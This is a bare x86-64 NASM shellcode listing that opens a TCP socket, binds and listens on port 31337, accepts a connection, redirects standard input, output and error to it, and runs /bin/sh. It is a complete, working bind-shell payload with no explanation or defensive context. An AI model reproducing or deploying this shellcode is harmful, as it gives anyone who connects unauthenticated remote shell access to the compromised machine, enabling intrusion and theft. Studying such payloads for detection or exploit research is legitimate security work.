 BITS 64
 push   0x2
 pop    rdi
 push   0x1
 pop    rsi
 push   0x6
 pop    rdx
 push   0x29
 pop    rax
 syscall
 mov    r8,rax
 xor    r10,r10
 push   r10
 push   r10
 mov    byte [rsp],0x2
 mov    word [rsp+0x2],0x697a
 mov    rsi,rsp
 push   r8
 pop    rdi
 push   0x10
 pop    rdx
 push   0x31
 pop    rax
 syscall
 push   r8
 pop    rdi
 push   0x1
 pop    rsi
 push   0x32
 pop    rax
 syscall 
 mov    rsi,rsp
 push   0x10
 mov    rdx,rsp
 push   r8
 pop    rdi
 push   0x2b
 pop    rax
 syscall 
 mov    rdi,rax
 push   0x3
 pop    rsi
 doop:
 dec    rsi
 push   0x21
 pop    rax
 syscall 
 jne    doop
 xor    rsi,rsi
 xor    rdx,rdx
 mov    rdi,0x68732f6e69622f2f
 shr    rdi,0x8
 push   rdi
 push   rsp
 pop    rdi
 push   0x3b
 pop    rax
 syscall 